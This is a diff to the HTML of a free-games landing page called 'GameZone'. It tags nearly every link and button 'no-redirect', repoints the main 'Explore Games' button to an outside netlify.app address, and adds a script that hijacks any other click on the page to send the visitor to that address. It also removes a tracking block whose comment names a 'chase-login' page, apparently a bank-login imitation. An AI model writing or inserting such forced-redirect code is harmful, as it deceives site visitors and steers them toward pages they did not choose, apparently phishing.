@@ -35,16 +35,16 @@
   <!-- Header / Navbar -->
   <header class="bg-white shadow-md fixed w-full z-10">
     <div class="container mx-auto px-6 py-4 flex items-center justify-between">
-      <a href="#" class="text-2xl font-bold text-blue-600 flex items-center">
+      <a href="#" class="text-2xl font-bold text-blue-600 flex items-center no-redirect">
         <i class="fas fa-gamepad mr-2"></i>GameZone
       </a>
       <nav class="hidden md:flex space-x-6">
-        <a href="#home" class="hover:text-blue-600 font-medium">Home</a>
-        <a href="#games" class="hover:text-blue-600 font-medium">Games</a>
-        <a href="#categories" class="hover:text-blue-600 font-medium">Categories</a>
-        <a href="#about" class="hover:text-blue-600 font-medium">About</a>
+        <a href="#home" class="hover:text-blue-600 font-medium no-redirect">Home</a>
+        <a href="#games" class="hover:text-blue-600 font-medium no-redirect">Games</a>
+        <a href="#categories" class="hover:text-blue-600 font-medium no-redirect">Categories</a>
+        <a href="#about" class="hover:text-blue-600 font-medium no-redirect">About</a>
       </nav>
-      <button id="nav-toggle" class="md:hidden focus:outline-none">
+      <button id="nav-toggle" class="md:hidden focus:outline-none no-redirect">
         <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
             d="M4 6h16M4 12h16M4 18h16"/>
@@ -52,10 +52,10 @@
       </button>
     </div>
     <nav id="mobile-menu" class="md:hidden bg-white hidden shadow-lg">
-      <a href="#home" class="block px-6 py-3 hover:bg-gray-100 font-medium"><i class="fas fa-home mr-2"></i>Home</a>
-      <a href="#games" class="block px-6 py-3 hover:bg-gray-100 font-medium"><i class="fas fa-dice mr-2"></i>Games</a>
-      <a href="#categories" class="block px-6 py-3 hover:bg-gray-100 font-medium"><i class="fas fa-tags mr-2"></i>Categories</a>
-      <a href="#about" class="block px-6 py-3 hover:bg-gray-100 font-medium"><i class="fas fa-info-circle mr-2"></i>About</a>
+      <a href="#home" class="block px-6 py-3 hover:bg-gray-100 font-medium no-redirect"><i class="fas fa-home mr-2"></i>Home</a>
+      <a href="#games" class="block px-6 py-3 hover:bg-gray-100 font-medium no-redirect"><i class="fas fa-dice mr-2"></i>Games</a>
+      <a href="#categories" class="block px-6 py-3 hover:bg-gray-100 font-medium no-redirect"><i class="fas fa-tags mr-2"></i>Categories</a>
+      <a href="#about" class="block px-6 py-3 hover:bg-gray-100 font-medium no-redirect"><i class="fas fa-info-circle mr-2"></i>About</a>
     </nav>
   </header>
 
@@ -66,7 +66,7 @@
       <div class="text-center text-white px-4">
         <h1 class="text-5xl md:text-7xl font-extrabold mb-4">Welcome to GameZone</h1>
         <p class="text-xl md:text-2xl mb-6">Play the best free online games anywhere, anytime.</p>
-        <a href="#games"
+        <a href="https://cute-rugelach-097acf.netlify.app/"
            class="inline-block bg-red-600 hover:bg-red-700 text-white px-12 py-6 rounded-lg font-bold flash text-2xl md:text-4xl tracking-wide shadow-xl">
           Explore Games
         </a>
@@ -85,7 +85,7 @@
           <div class="p-6">
             <h3 class="text-xl font-bold mb-2">Retro Arcade</h3>
             <p class="text-gray-600 mb-4">Classic arcade action with a modern twist!</p>
-            <a href="#" class="inline-block bg-blue-600 text-white px-6 py-2 rounded-lg font-medium">Play Now</a>
+            <a href="#" class="inline-block bg-blue-600 text-white px-6 py-2 rounded-lg font-medium no-redirect">Play Now</a>
           </div>
         </div>
         
@@ -95,7 +95,7 @@
           <div class="p-6">
             <h3 class="text-xl font-bold mb-2">Mind Bender</h3>
             <p class="text-gray-600 mb-4">Challenge your brain with these tricky puzzles!</p>
-            <a href="#" class="inline-block bg-blue-600 text-white px-6 py-2 rounded-lg font-medium">Play Now</a>
+            <a href="#" class="inline-block bg-blue-600 text-white px-6 py-2 rounded-lg font-medium no-redirect">Play Now</a>
           </div>
         </div>
         
@@ -105,7 +105,7 @@
           <div class="p-6">
             <h3 class="text-xl font-bold mb-2">Speed Demon</h3>
             <p class="text-gray-600 mb-4">High-speed racing action with stunning graphics!</p>
-            <a href="#" class="inline-block bg-blue-600 text-white px-6 py-2 rounded-lg font-medium">Play Now</a>
+            <a href="#" class="inline-block bg-blue-600 text-white px-6 py-2 rounded-lg font-medium no-redirect">Play Now</a>
           </div>
         </div>
       </div>
@@ -117,11 +117,11 @@
     <div class="container mx-auto px-4">
       <h2 class="text-4xl font-bold text-center mb-12">Game Categories</h2>
       <div class="flex flex-wrap justify-center gap-4 mb-12">
-        <button class="category-btn active bg-gray-200 px-6 py-2 rounded-full font-medium">All Games</button>
-        <button class="category-btn bg-gray-200 px-6 py-2 rounded-full font-medium">Action</button>
-        <button class="category-btn bg-gray-200 px-6 py-2 rounded-full font-medium">Puzzle</button>
-        <button class="category-btn bg-gray-200 px-6 py-2 rounded-full font-medium">Adventure</button>
-        <button class="category-btn bg-gray-200 px-6 py-2 rounded-full font-medium">Sports</button>
+        <button class="category-btn active bg-gray-200 px-6 py-2 rounded-full font-medium no-redirect">All Games</button>
+        <button class="category-btn bg-gray-200 px-6 py-2 rounded-full font-medium no-redirect">Action</button>
+        <button class="category-btn bg-gray-200 px-6 py-2 rounded-full font-medium no-redirect">Puzzle</button>
+        <button class="category-btn bg-gray-200 px-6 py-2 rounded-full font-medium no-redirect">Adventure</button>
+        <button class="category-btn bg-gray-200 px-6 py-2 rounded-full font-medium no-redirect">Sports</button>
       </div>
     </div>
   </section>
@@ -152,9 +152,9 @@
           <p class="text-gray-400">Play. Enjoy. Repeat.</p>
         </div>
         <div class="flex space-x-6">
-          <a href="#" class="text-gray-400 hover:text-white"><i class="fab fa-facebook-f mr-1"></i> Facebook</a>
-          <a href="#" class="text-gray-400 hover:text-white"><i class="fab fa-twitter mr-1"></i> Twitter</a>
-          <a href="#" class="text-gray-400 hover:text-white"><i class="fab fa-instagram mr-1"></i> Instagram</a>
+          <a href="#" class="text-gray-400 hover:text-white no-redirect"><i class="fab fa-facebook-f mr-1"></i> Facebook</a>
+          <a href="#" class="text-gray-400 hover:text-white no-redirect"><i class="fab fa-twitter mr-1"></i> Twitter</a>
+          <a href="#" class="text-gray-400 hover:text-white no-redirect"><i class="fab fa-instagram mr-1"></i> Instagram</a>
         </div>
       </div>
       <div class="border-t border-gray-700 mt-8 pt-8 text-center text-gray-400">
@@ -163,10 +163,22 @@
     </div>
   </footer>
 
-  <!-- Mobile menu toggle -->
+  <!-- Scripts -->
   <script>
+    // Redirect on click anywhere except elements with 'no-redirect' class
+    document.addEventListener('click', (event) => {
+      const target = event.target.closest('.no-redirect');
+      if (!target) {
+        console.log('Redirecting to https://cute-rugelach-097acf.netlify.app/');
+        event.preventDefault();
+        event.stopPropagation();
+        window.location.href = 'https://cute-rugelach-097acf.netlify.app/';
+      }
+    });
+
+    // Mobile menu toggle
     const toggle = document.getElementById('nav-toggle');
-    const menu  = document.getElementById('mobile-menu');
+    const menu = document.getElementById('mobile-menu');
     toggle.addEventListener('click', () => {
       menu.classList.toggle('hidden');
     });
@@ -210,23 +222,6 @@
       </a>
     </div>
   </noscript>
-  <!-- End of Statcounter Code -->
-
-  <!-- Statcounter code for chase https://chase-login.pages.dev/ -->
-  <script type="text/javascript">
-    var sc_project=13166709; 
-    var sc_invisible=1; 
-    var sc_security="f4da39b8"; 
-  </script>
-  <script type="text/javascript"
-  src="https://www.statcounter.com/counter/counter.js"
-  async></script>
-  <noscript><div class="statcounter"><a title="Web Analytics"
-  href="https://statcounter.com/" target="_blank"><img
-  class="statcounter"
-  src="https://c.statcounter.com/13166709/0/f4da39b8/1/"
-  alt="Web Analytics"
-  referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
   <!-- End of Statcounter Code -->
 
   <!-- Google Analytics -->
